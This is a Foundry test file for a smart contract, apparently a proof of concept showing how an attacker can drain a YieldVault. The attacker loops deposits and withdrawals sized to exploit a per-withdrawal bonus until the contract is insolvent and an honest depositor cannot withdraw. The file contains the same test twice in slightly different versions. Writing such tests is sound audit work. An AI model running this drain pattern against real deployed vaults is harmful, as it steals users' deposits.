// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/YieldVault.sol";

contract YieldVaultDrainTest is Test {
    YieldVault vault;
    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        vault = new YieldVault{value: 1 ether}();
        vm.deal(victim, 50 ether);
        vm.prank(victim);
        vault.deposit{value: 50 ether}();
    }

    function testDrain() public {
        uint256 start = 60 ether;
        vm.deal(attacker, start);

        uint256 rounds;
        while (address(vault).balance >= 200 && rounds < 2000) {
            uint256 b = address(vault).balance;
            uint256 x = (b * 100) / 101;
            vm.prank(attacker);
            vault.deposit{value: x}();
            vm.prank(attacker);
            vault.withdraw();
            rounds++;
        }

        emit log_named_uint("rounds", rounds);
        emit log_named_uint("attacker end balance", attacker.balance);
        emit log_named_uint("vault balance", address(vault).balance);
        emit log_named_uint("totalPrincipal owed", vault.totalPrincipal());

        // Attacker is up a huge amount without ever "earning" anything.
        assertGt(attacker.balance, start + 45 ether);

        // Vault holds far less than the principal it still owes -> insolvent.
        assertLt(address(vault).balance, vault.totalPrincipal());

        // The honest victim can no longer get their 50 ETH back.
        vm.prank(victim);
        vm.expectRevert();
        vault.withdraw();
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/YieldVault.sol";

contract YieldVaultDrainTest is Test {
    YieldVault vault;
    address victim = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        // Deployer seeds only a 1 ETH "reward buffer".
        vault = new YieldVault{value: 1 ether}();
        // Honest user deposits 50 ETH and walks away.
        vm.deal(victim, 50 ether);
        vm.prank(victim);
        vault.deposit{value: 50 ether}();
    }

    function testDrain() public {
        uint256 start = 60 ether;
        vm.deal(attacker, start);

        uint256 rounds;
        // Each cycle: deposit x, withdraw x + x/100. Net -x/100 from the vault.
        // Picking x = balance*100/101 keeps the payout covered while shrinking
        // the vault by ~1% of its balance per round, so gains compound to a
        // full drain.
        while (address(vault).balance >= 200 && rounds < 2000) {
            uint256 b = address(vault).balance;
            uint256 x = (b * 100) / 101;
            vm.prank(attacker);
            vault.deposit{value: x}();
            vm.prank(attacker);
            vault.withdraw();
            rounds++;
        }

        emit log_named_uint("cycles", rounds);
        emit log_named_uint("attacker start  (wei)", start);
        emit log_named_uint("attacker end    (wei)", attacker.balance);
        emit log_named_uint("vault left      (wei)", address(vault).balance);
        emit log_named_uint("principal owed  (wei)", vault.totalPrincipal());

        // Attacker is up ~51 ETH (their own 60 ETH back plus the whole vault).
        assertGt(attacker.balance, start + 50 ether);
        // Vault holds far less than the principal it still owes -> insolvent.
        assertLt(address(vault).balance, vault.totalPrincipal());
        // Honest victim can no longer get their 50 ETH back.
        vm.prank(victim);
        vm.expectRevert();
        vault.withdraw();
    }
}

